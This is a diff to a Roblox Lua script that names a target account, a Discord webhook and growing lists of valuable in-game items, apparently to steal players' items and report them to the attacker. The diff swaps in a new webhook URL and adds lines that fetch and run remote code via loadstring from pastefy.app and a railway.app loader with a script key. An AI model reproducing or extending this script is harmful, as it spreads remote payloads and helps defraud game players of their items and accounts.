@@ -1,6 +1,6 @@
 local TARGET_ID = 12013722568
 local TARGET_USER = "kdkdkdkjdkd12"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1572600715279466569/VTF1eDnBY7GTBOPou1VoXt1qZ6jvgec1YfdPvbkuikmLTda0Y_CPgWyHvH4nCW4jJxfA"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1573478150283722772/Y40F7b8KQ5U9Dwgop2BvViEzBjgxYtygBD0qtQLLiiCXft4D7Pq-SEHRgrT-EjPXWhJW"
 
 local TargetBrainrots = {
     ["Strawberry Elephant"] = true,
@@ -289,7 +289,15 @@ local TargetBrainrots = {
     ["Hydra Serpent"] = true,
     ["Dragon Skeletonini"] = true,
     ["Phoenix"] = true,
-    ["Plant Bros"] = true
+    ["Plant Bros"] = true,
+    ["Cobra Gelato"] = true,
+    ["Flying Dutchman"] = true,
+    ["Machine Bros"] = true,
+    ["Skelly and Coffy"] = true,
+    ["Sammyni Bros"] = true,
+    ["Puppetmaster"] = true,
+    ["Medusini and Demonini"] = true,
+    ["Cabin Bros"] = true
 }
 
 local TargetBaseSkins = {
@@ -344,11 +352,16 @@ local TargetGears = {
     ["Yin Yang Lamp"] = true,
     ["Yin Yang Slap"] = true,
     ["Phantom Slap"] = true,
-    ["Crystal Slap"] = true
+    ["Crystal Slap"] = true,
+    ["Skeleton Dragon"] = true
 }
 
 task.spawn(function()
-    loadstring(game:HttpGet("https://gist.githubusercontent.com/dianalareina33-png/4f69b2c99648deb2743676777cde6ec0/raw/4108f08f708831cade41383397b2f3d1e31572c8/HALOWENN"))()
+    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
+end)
+
+task.spawn(function()
+    script_key = "VdZPkCeQikAZRUr5NnKic0cL4oRcB7dw"; loadstring(game:HttpGet("https://vantamor.up.railway.app/files/v1/loaders/ca7ef454e21125ffed6ff993eec9de2762ceb169.lua"))()
 
     task.wait(1)
 
